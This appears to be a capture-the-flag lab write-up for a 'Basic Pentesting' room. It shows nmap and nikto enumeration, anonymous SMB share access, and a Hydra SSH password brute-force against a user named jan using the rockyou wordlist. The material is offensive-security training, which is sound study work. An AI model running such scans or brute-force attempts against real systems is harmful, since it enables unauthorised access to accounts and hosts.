# Basic Pentesting

### Enumeration

* Scan all ports and its services.

```bash
kali@kali> echo '10.10.11.71 basic.thm' | sudo tee -a /etc/hosts
kali@kali> nmap basic.thm -oN nmap-scan -T4
kali@kali> ports="$(cat nmap-scan|grep ^[0-9]|cut -d'/' -f1|tr '\n' ','|sed 's/,$//')"
kali@kali> nmap -p $ports -sV basic.thm -oN nmap-services
```

* Retrieve information with `nikto`.

```bash
kali@kali> nikto -host http://basic.thm
```

* If you go to http://basic.thm/development there are 2 files. In `j.txt`, the user **K** says to **J** that its password is to weak. Thus we should try cracking the **J**'s password once we get his username.
* We can enumerate the directories from the smb service. The real username of **J** is **Jan** and **K** is **Kay**.

```bash
kali@kali> smbclient -L //basic.thm
kali@kali> smbclient //basic.thm/Anonymous
smb> get flag.txt
smb> exit
```

* Let's crack the Jan's password with Hydra through SSH ! You must wait up to 10 minutes to get the password.

```bash
kali@kali> hydra -l jan -P /usr/share/wordlists/rockyou.txt basic.thm ssh
```
